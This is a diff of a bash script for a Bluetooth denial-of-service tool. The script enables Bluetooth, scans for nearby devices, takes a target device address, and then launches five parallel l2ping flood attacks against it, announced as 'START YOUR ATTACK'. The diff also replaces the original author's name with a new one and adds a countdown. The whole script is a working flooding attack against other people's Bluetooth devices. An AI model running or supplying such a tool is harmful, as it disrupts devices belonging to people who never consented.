@@ -21,14 +21,21 @@ echo -e "$yellow| |_) | | |_| |  __/ (_| | (_) \__ \  __/ |   $nc"
 echo -e "$red|blue/|_|\__,_|\dos|\__,_|\___/|___/\___|_| $nc"
 echo -e "$blue _____________________________________By Anon$nc"
 echo ""
-echo -e "$white Author : SURAJ CHAVDA$nc"
-echo -e "$white SCRIPT : SURAJ CHAVDA$nc"
-echo -e "$white ANON   : SURAJ CHAVDA$nc"
+echo -e "$white Author : Anlos$nc"
+echo -e "$white SCRIPT : Anlos$nc"
+echo -e "$white ANON   : Anlos$nc"
 sudo lsmod | grep blue &>/dev/null
 systemctl enable bluetooth.service &>/dev/null
 systemctl start bluetooth.service &>/dev/null
-echo ""
-if rfkill unblock bluetooth ;then 
+
+if rfkill unblock bluetooth ;then
+echo "3"
+sleep 1
+echo "2"
+sleep 1
+echo "1"
+sleep 1
+ 
 echo -e "$red Your Bluetooth is Turned On$nc"
 else echo -e "Some Problem With Turning On Bluetooth"
 fi
@@ -40,13 +47,10 @@ xterm -hold -e 'while [ 1 ]; do hcitool scan ;done' &
 read -p $'\033[1;33m[*]Enter B.D.Address (xx:xx:xx:xx:xx:xx) : \033[0m' bdadd
 echo -e "" 
 read -p $'\033[1;33m[*]PRESS ENTER TO START YOUR ATTACK\033[0m'
-xterm -e l2ping -f $bdadd  &
-xterm -e l2ping -f $bdadd  &
-xterm -e l2ping -f $bdadd  &
-xterm -e l2ping -f $bdadd  &
-xterm -e l2ping -f $bdadd  
-
-
-
+xterm -e l2ping -f $bdadd&
+xterm -e l2ping -f $bdadd&
+xterm -e l2ping -f $bdadd&
+xterm -e l2ping -f $bdadd&
+xterm -e l2ping -f $bdadd&
 
 echo -e "$yellow Tool By Anon(Suraj)$nc"
